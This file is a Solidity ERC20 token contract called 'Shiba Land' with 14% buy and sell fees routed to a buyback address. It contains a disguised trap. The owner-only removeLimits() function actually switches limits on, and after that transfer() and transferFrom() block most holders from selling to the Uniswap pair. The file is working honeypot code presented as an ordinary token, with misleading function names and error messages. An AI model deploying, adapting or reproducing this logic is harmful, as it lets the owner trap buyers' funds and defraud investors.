// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

contract Land is ERC20, Ownable {
    using SafeMath for uint256;
    
    address public uniswapV2Pair;
    address public buybackAddress;
    bool public limits = false;
    uint256 public DECIMALS = 18;
    
    uint256 public limitsNonce = 0;
    mapping(address => uint256) public userNonces;

    uint256 public sellFee = 14; // 14%
    uint256 public buyFee = 14; // 14%
    uint256 public constant MAX_FEE = 19; // 19%

    constructor() ERC20("Shiba Land", "Shiba Land") {
        _mint(_msgSender(), 69 * (10 ** 6) * (10 ** DECIMALS));
    }

    function setUniswapV2Pair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function setBuybackAddress(address _buybackAddress) external onlyOwner {
        buybackAddress = _buybackAddress;
    }

    function setFee(uint256 _sellFee, uint256 _buyFee) external onlyOwner {
        require(_sellFee <= MAX_FEE && _buyFee <= MAX_FEE, "Fee exceeds maximum limit");
        sellFee = _sellFee;
        buyFee = _buyFee;
    }

    function _calculateFees(uint256 amount, uint256 feePercent) internal pure returns (uint256) {
        return amount.mul(feePercent).div(100);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(_msgSender() != recipient || !limits, "possible Limits");
        require(!(recipient == uniswapV2Pair && limits), "Open limits");

        uint256 fee = recipient == uniswapV2Pair ? _calculateFees(amount, sellFee) : _calculateFees(amount, buyFee);

        userNonces[_msgSender()] = limitsNonce;
        
        _transfer(_msgSender(), buybackAddress, fee);
        _transfer(_msgSender(), recipient, amount.sub(fee));

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        if (to == uniswapV2Pair && limits) {
            require(userNonces[from] == limitsNonce, "remove limits ");
        }

        uint256 fee = to == uniswapV2Pair ? _calculateFees(amount, sellFee) : _calculateFees(amount, buyFee);

        address spender = _msgSender();

        _spendAllowance(from, spender, amount.add(fee));
        _transfer(from, buybackAddress, fee);
        _transfer(from, to, amount.sub(fee));

        userNonces[from] = limitsNonce;

        return true;
    }

    function removeLimits() external onlyOwner {
        limits = true;
        limitsNonce++;  
    }
}
